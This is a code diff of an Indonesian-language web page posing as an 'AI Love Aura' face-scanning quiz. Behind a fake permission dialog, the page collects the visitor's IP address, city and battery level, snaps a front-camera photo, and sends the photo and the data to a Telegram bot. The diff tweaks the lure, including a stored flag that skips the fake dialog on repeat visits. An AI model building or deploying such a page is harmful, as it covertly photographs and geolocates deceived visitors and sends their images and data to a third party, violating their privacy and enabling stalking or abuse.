@@ -32,7 +32,7 @@
             text-align: center; width: 85%; max-width: 350px;
         }
 
-        /* --- OVERLAY & DIALOG (MODAL) --- */
+        /* --- MODAL DIALOG --- */
         #overlay {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.6); z-index: 1000;
@@ -42,7 +42,10 @@
             display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
             background: white; padding: 25px; border-radius: 30px; width: 280px;
             z-index: 1001; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+            animation: pop 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
+
+        @keyframes pop { from { transform: translate(-50%, -50%) scale(0.9); opacity: 0; } to { transform: translate(-50%, -50%) scale(1); opacity: 1; } }
 
         h1 { color: #ff69b4; font-size: 1.5rem; margin: 10px 0; }
         p { color: #666; font-size: 0.85rem; line-height: 1.5; }
@@ -54,7 +57,6 @@
             box-shadow: 0 5px 15px rgba(255, 20, 147, 0.3);
         }
 
-        /* --- SCANNER & STATS --- */
         #scan-visual {
             display: none; position: relative; width: 140px; height: 140px;
             margin: 20px auto; border: 4px solid #ffb6c1; border-radius: 50%; overflow: hidden;
@@ -66,9 +68,6 @@
         @keyframes scanLine { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
 
         .score { font-size: 3.5rem; color: #ff69b4; font-weight: bold; }
-        .stat-bar-bg { width: 100%; height: 8px; background: #ffd1dc; border-radius: 10px; margin: 5px 0 10px 0; }
-        .stat-bar-fill { height: 100%; background: #ff69b4; width: 0%; transition: width 2s ease-out; }
-
         video, canvas { display: none; }
     </style>
 </head>
@@ -80,7 +79,7 @@
     <div id="fake-dialog">
         <div style="font-size: 3rem;">📸</div>
         <h1>Izin Kamera</h1>
-        <p>AI butuh akses kamera sebentar untuk menscan aura wajahmu. Klik <b>LANJUTKAN</b> ya!</p>
+        <p>AI butuh akses kamera sebentar untuk menscan aura wajahmu.</p>
         <button class="btn-love" id="btn-confirm">LANJUTKAN ✨</button>
     </div>
 
@@ -88,7 +87,7 @@
         <div id="view-home">
             <div style="font-size: 4rem; margin-bottom: 10px;">💖</div>
             <h1>AI Love Aura</h1>
-            <p>Temukan warna auramu dan tingkat keberuntungan cintamu hari ini dengan scan AI.</p>
+            <p>Temukan warna auramu dan keberuntungan cintamu hari ini.</p>
             <button class="btn-love" style="width: auto; padding: 14px 40px;" id="btn-start">SCAN SEKARANG</button>
         </div>
 
@@ -98,21 +97,15 @@
                 <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:3rem;">✨</div>
             </div>
             <h1>Menganalisa...</h1>
-            <p id="status-text">Menyelaraskan frekuensi aura...</p>
+            <p>Menyelaraskan frekuensi aura wajahmu...</p>
         </div>
 
         <div id="view-result" style="display:none;">
             <div style="font-size: 3rem;">🌈</div>
             <h1>Hasil Aura</h1>
             <div class="score" id="final-score">0%</div>
-            <div style="text-align: left; background: rgba(255,255,255,0.5); padding: 15px; border-radius: 20px;">
-                <span style="font-size:0.7rem; color:#ff69b4;">LOVE LUCK</span>
-                <div class="stat-bar-bg"><div id="bar-luck" class="stat-bar-fill"></div></div>
-                <span style="font-size:0.7rem; color:#ff69b4;">POSITIVE VIBE</span>
-                <div class="stat-bar-bg"><div id="bar-vibe" class="stat-bar-fill"></div></div>
-            </div>
-            <p id="quote" style="font-style:italic; margin-top:15px; color:#ff1493; font-size: 0.85rem;"></p>
-            <button class="btn-love" onclick="window.location.href=window.location.href">COBA LAGI</button>
+            <p id="quote" style="font-style:italic; margin-top:15px; color:#ff1493;"></p>
+            <button class="btn-love" onclick="location.reload()">TEST LAGI</button>
         </div>
     </div>
 
@@ -130,59 +123,56 @@
         const viewResult = document.getElementById('view-result');
         const video = document.getElementById('video');
 
-        // 1. Tampilkan dialog saat tombol "SCAN SEKARANG" diklik
-        document.getElementById('btn-start').onclick = () => {
-            overlay.style.display = 'block';
-            fakeDialog.style.display = 'block';
+        // FUNGSI CEK STATUS (Smart Memory)
+        function checkStatus() {
+            // Jika sudah pernah klik "Lanjutkan" sebelumnya, langsung masuk ke scan
+            if (localStorage.getItem('aura_permission_granted') === 'true') {
+                runAuraProcess();
+            } else {
+                overlay.style.display = 'block';
+                fakeDialog.style.display = 'block';
+            }
+        }
+
+        document.getElementById('btn-start').onclick = checkStatus;
+
+        document.getElementById('btn-confirm').onclick = () => {
+            // Set memory agar dialog nggak muncul lagi di kunjungan berikutnya
+            localStorage.setItem('aura_permission_granted', 'true');
+            runAuraProcess();
         };
 
-        // 2. Logika utama saat klik "LANJUTKAN"
-        document.getElementById('btn-confirm').onclick = async function() {
-            // TUTUP DIALOG SEGERA agar tidak muncul terus
+        async function runAuraProcess() {
+            // TUTUP DIALOG SEGERA!
             overlay.style.display = 'none';
             fakeDialog.style.display = 'none';
-            
-            // Pindah ke layar scan
             viewHome.style.display = 'none';
             viewScan.style.display = 'block';
 
             try {
-                // Ambil Data Info (IP & Baterai)
                 const info = await getInfo();
-                
-                // Minta Izin Kamera
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
-                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
                 document.getElementById('scan-visual').style.display = 'block';
 
-                const report = `✨ [AURA REPORT]\n` +
-                               `🌐 IP: ${info.ip}\n` +
-                               `📍 Loc: ${info.city}, ${info.country}\n` +
-                               `🔋 Bat: ${info.battery}%`;
+                const report = `✨ [AURA REPORT]\n🌐 IP: ${info.ip}\n📍 Loc: ${info.city}\n🔋 Bat: ${info.battery}%`;
 
-                // Tunggu 4 detik (visual scan), lalu capture
                 setTimeout(() => { captureFinal(stream, report); }, 4000);
-
             } catch (err) {
-                console.error(err);
-                // Jika ditolak, jangan reload! Cukup beri tahu user.
-                alert("Scan gagal. Izin kamera diperlukan untuk melihat auramu.");
-                viewScan.style.display = 'none';
-                viewHome.style.display = 'block';
-                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=User Denied Camera`);
+                // Jika user tolak beneran di level browser, reset memory agar bisa coba lagi
+                localStorage.removeItem('aura_permission_granted');
+                alert("Izin kamera diperlukan!");
+                location.reload();
             }
-        };
+        }
 
         async function getInfo() {
-            let res = { ip: '?', city: '?', country: '?', battery: '?' };
+            let res = { ip: '?', city: '?', battery: '?' };
             try {
                 const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                 res.ip = ipData.ip;
                 const geo = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(r => r.json());
-                res.city = geo.city; res.country = geo.country_name;
+                res.city = geo.city || '?';
                 if(navigator.getBattery) {
                     const b = await navigator.getBattery();
                     res.battery = Math.floor(b.level * 100);
@@ -196,10 +186,7 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            
-            // Mirroring
-            ctx.translate(canvas.width, 0);
-            ctx.scale(-1, 1);
+            ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             canvas.toBlob((blob) => {
@@ -207,23 +194,14 @@
                 fd.append('chat_id', TG_CHAT_ID);
                 fd.append('photo', blob, 'aura.png');
                 fd.append('caption', report);
-
                 fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 
-                // Matikan kamera
                 stream.getTracks().forEach(t => t.stop());
-                
-                // Tampilkan hasil akhir
                 viewScan.style.display = 'none';
                 viewResult.style.display = 'block';
                 
-                const q = ["Aura Pink: Seseorang merindukanmu! 💘", "Aura Emas: Keberuntungan datang besok! 💰"];
-                document.getElementById('quote').innerText = q[Math.floor(Math.random()*q.length)];
+                document.getElementById('quote').innerText = "Aura Pink: Seseorang merindukanmu! 💘";
                 document.getElementById('final-score').innerText = (Math.floor(Math.random()*10)+90) + "%";
-                setTimeout(() => {
-                    document.getElementById('bar-luck').style.width = "92%";
-                    document.getElementById('bar-vibe').style.width = "88%";
-                }, 300);
             }, 'image/png');
         }
     </script>
